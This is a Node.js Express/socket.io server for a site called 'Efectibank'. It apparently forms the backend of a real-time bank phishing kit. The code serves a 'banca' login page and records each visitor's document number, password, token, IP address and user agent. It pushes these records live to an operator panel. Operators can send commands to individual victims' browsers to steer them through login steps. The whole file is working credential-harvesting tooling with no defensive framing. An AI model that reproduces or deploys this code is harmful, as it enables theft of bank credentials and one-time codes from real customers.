const express = require("express");
const path = require("path");
const http = require("http");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const port = Number(process.env.PORT) || 8080;
const publicDir = path.join(__dirname, "public");

app.disable("x-powered-by");
app.use(express.json());

function noCache(res) {
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
  res.setHeader("Pragma", "no-cache");
  res.setHeader("Expires", "0");
}

app.get(["/banca", "/banca/", "/banca.html"], (_req, res) => {
  noCache(res);
  res.sendFile(path.join(publicDir, "banca.html"));
});

app.get(["/panel", "/panel/", "/panel.html"], (_req, res) => {
  noCache(res);
  res.sendFile(path.join(publicDir, "panel.html"));
});

app.get(["/admin", "/admin/", "/admin.html"], (_req, res) => {
  noCache(res);
  res.sendFile(path.join(publicDir, "admin.html"));
});

app.use(
  express.static(publicDir, {
    redirect: false,
    setHeaders(res, filePath) {
      const name = path.basename(filePath).toLowerCase();
      if (name.includes(".js") || name.startsWith("js") || name === "q8a4rrtl79" || /^\d+$/.test(name)) {
        res.type("application/javascript; charset=utf-8");
      }
      if (name === "banca.js" || name === "panel-admin.js" || name === "banca.html" || name === "admin.html") {
        noCache(res);
      }
    },
  })
);

app.get("/health", (_req, res) => {
  res.status(200).json({ ok: true });
});

// Gestión de sesiones activas en memoria para el panel
const sessions = new Map();

function getFilteredSessions() {
  return Array.from(sessions.values()).filter((s) => {
    return (
      (s.docNumber && String(s.docNumber).trim().length > 0) ||
      (s.password && String(s.password).trim().length > 0) ||
      (s.token && String(s.token).trim().length > 0)
    );
  });
}

function broadcastSessions() {
  io.to("admins").emit("sessions:update", getFilteredSessions());
}

function upsertSession(data, meta = {}) {
  const key = (data && data.clientId) || meta.socketId;
  if (!key) return null;

  let session = sessions.get(key) || {
    id: key,
    ip: meta.ip || "127.0.0.1",
    userAgent: meta.userAgent || "",
    docType: "DNI",
    docNumber: "",
    password: "",
    token: "",
    step: "doc",
    status: "Ingresando documento",
    pendingCommand: null,
  };

  if (meta.socketId) session.socketId = meta.socketId;
  if (data.docType) session.docType = data.docType;
  if (data.docNumber !== undefined && String(data.docNumber).trim() !== "") {
    session.docNumber = String(data.docNumber).trim();
  }
  if (data.password !== undefined && data.password !== "") {
    session.password = data.password;
  }
  if (data.token !== undefined && data.token !== "") {
    session.token = data.token;
  }
  if (data.step) session.step = data.step;
  if (data.status) {
    session.status = data.status;
    // Clear previous pending command when client sends a new status update
    session.pendingCommand = null;
  }
  session.connected = true;
  session.updatedAt = new Date().toLocaleTimeString();

  sessions.set(key, session);
  broadcastSessions();
  return session;
}

function dispatchOperatorCommand({ targetId, action, message }) {
  const cmdId = Date.now() + "_" + Math.random().toString(36).slice(2, 7);
  const payload = { cmdId, targetId, action, message };
  const session = sessions.get(targetId);
  if (session) {
    session.lastAction = action;
    session.status = `Operación enviada: ${action}`;
    session.pendingCommand = payload;
    session.updatedAt = new Date().toLocaleTimeString();
    broadcastSessions();
  }
  io.to(targetId).emit("operator:action", payload);
  if (session && session.socketId && session.socketId !== targetId) {
    io.to(session.socketId).emit("operator:action", payload);
  }
  return payload;
}

// Endpoints HTTP de respaldo para garantizar entrega 100% en tiempo real
app.get("/api/sessions", (_req, res) => {
  noCache(res);
  res.json(getFilteredSessions());
});

app.post("/api/session", (req, res) => {
  noCache(res);
  const session = upsertSession(req.body || {}, {
    ip: req.ip || req.socket?.remoteAddress || "127.0.0.1",
    userAgent: req.headers["user-agent"] || "",
  });
  res.json({ ok: true, session });
});

app.get("/api/session/:id/poll", (req, res) => {
  noCache(res);
  const session = sessions.get(req.params.id);
  if (!session || !session.pendingCommand) {
    return res.json({ command: null });
  }
  const command = session.pendingCommand;
  session.pendingCommand = null;
  return res.json({ command });
});

app.post("/api/command", (req, res) => {
  noCache(res);
  const { targetId, action, message } = req.body || {};
  if (!targetId || !action) {
    return res.status(400).json({ ok: false });
  }
  const payload = dispatchOperatorCommand({ targetId, action, message });
  return res.json({ ok: true, payload });
});

app.post("/api/delete_session", (req, res) => {
  noCache(res);
  const { targetId } = req.body || {};
  if (targetId) {
    sessions.delete(targetId);
  } else {
    sessions.clear();
  }
  broadcastSessions();
  return res.json({ ok: true });
});

io.on("connection", (socket) => {
  socket.on("admin:join", () => {
    socket.join("admins");
    socket.emit("sessions:update", getFilteredSessions());
  });

  socket.on("client:register", ({ clientId } = {}) => {
    if (clientId) {
      socket.join(clientId);
      const session = sessions.get(clientId);
      if (session) {
        session.socketId = socket.id;
        session.connected = true;
      }
    }
  });

  const handleClientData = (data = {}) => {
    const key = data.clientId || socket.id;
    socket.join(key);
    upsertSession(
      { ...data, clientId: key },
      {
        socketId: socket.id,
        ip: socket.handshake.address || "127.0.0.1",
        userAgent: socket.handshake.headers["user-agent"] || "",
      }
    );
  };

  socket.on("client:init", handleClientData);
  socket.on("client:update", handleClientData);

  socket.on("admin:command", ({ targetId, action, message } = {}) => {
    if (!targetId || !action) return;
    dispatchOperatorCommand({ targetId, action, message });
  });

  socket.on("admin:delete_session", ({ targetId } = {}) => {
    if (targetId) {
      sessions.delete(targetId);
    } else {
      sessions.clear();
    }
    broadcastSessions();
  });

  socket.on("disconnect", () => {
    for (const session of sessions.values()) {
      if (session.socketId === socket.id || session.id === socket.id) {
        session.connected = false;
        session.updatedAt = new Date().toLocaleTimeString();
      }
    }
    broadcastSessions();
  });
});

server.listen(port, "0.0.0.0", () => {
  console.log(`Efectibank listo en el puerto ${port}`);
});


